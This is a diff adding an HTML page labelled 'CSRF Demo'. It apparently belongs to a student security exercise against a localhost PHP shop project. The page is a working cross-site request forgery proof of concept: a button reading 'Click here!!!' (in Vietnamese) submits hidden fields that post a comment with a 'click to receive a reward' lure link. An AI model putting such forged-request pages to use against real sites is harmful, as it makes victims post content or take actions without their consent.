@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>CSRF Demo</title>
+	<style>
+		.button {
+			background-color: #4CAF50; 
+			border: none; 
+			color: white; 
+			padding: 10px 20px; 
+			text-align: center; 
+			text-decoration: none; 
+			display: inline-block; 
+			font-size: 16px; 
+			border-radius: 5px; 
+			cursor: pointer; 
+			box-shadow: 2px 2px 5px rgba(0,0,0,0.2); 
+		}
+
+		.button:hover {
+			background-color: #3e8e41; 
+		}
+	</style>
+</head>
+<body>
+	<form action="http://localhost:8080/Lopthu3_Tiet12345_Nhom8/do_an/index.php?act=ctsp&idsp=63" id="quangcao" method="post">
+	<div class="center">
+		<input type="text" name="name" id="name" value="csrf" style="display: none"><br>
+		<textarea name="comment" id="comment" style="display: none">
+			<a href="" style="color: blue; font-weight: bold;">Hãy bấm vào đây để nhận thưởng</a>
+		</textarea>
+
+		<br>
+		<input class="button" type="submit" name="submit" value="Bấm vào đây!!!">
+	</div>
+</form>
+</body>
+</html>
